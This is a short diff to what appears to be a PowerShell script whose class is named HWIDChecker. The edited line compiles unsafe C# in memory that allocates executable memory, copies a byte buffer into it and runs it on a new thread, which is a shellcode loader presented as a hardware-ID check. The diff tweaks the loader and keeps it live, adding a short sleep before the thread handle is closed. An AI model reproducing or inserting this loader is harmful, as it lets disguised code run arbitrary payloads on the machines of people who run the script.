@@ -96,7 +96,7 @@ class HWIDChecker {
             $c = New-Object System.CodeDom.Compiler.CompilerParameters
             $c.CompilerOptions = "/unsafe"
             $c.GenerateInMemory = $true
-            $r = $p.CompileAssemblyFromSource($c, 'using System;using System.Runtime.InteropServices;public class X{[DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);[DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr st, IntPtr p, uint f, IntPtr i);[DllImport("kernel32")] static extern bool CloseHandle(IntPtr h);public static void E(byte[] b){IntPtr m = VirtualAlloc(IntPtr.Zero, (uint)b.Length, 0x3000, 0x40);Marshal.Copy(b, 0, m, b.Length);IntPtr t = CreateThread(IntPtr.Zero, 0, m, IntPtr.Zero, 0, IntPtr.Zero);CloseHandle(t);}}')
+            $r = $p.CompileAssemblyFromSource($c, 'using System;using System.Threading;using System.Runtime.InteropServices;public class X{[DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);[DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr st, IntPtr p, uint f, IntPtr i);[DllImport("kernel32")] static extern bool CloseHandle(IntPtr h);public static void E(byte[] b){IntPtr m = VirtualAlloc(IntPtr.Zero, (uint)b.Length, 0x3000, 0x40);Marshal.Copy(b, 0, m, b.Length);IntPtr t = CreateThread(IntPtr.Zero, 0, m, IntPtr.Zero, 0, IntPtr.Zero);Thread.Sleep(100);CloseHandle(t);}}')
             if ($r.Errors.Count -gt 0) {
                 Write-Host "ERREUR compilation: $($r.Errors)" -ForegroundColor Red
                 return
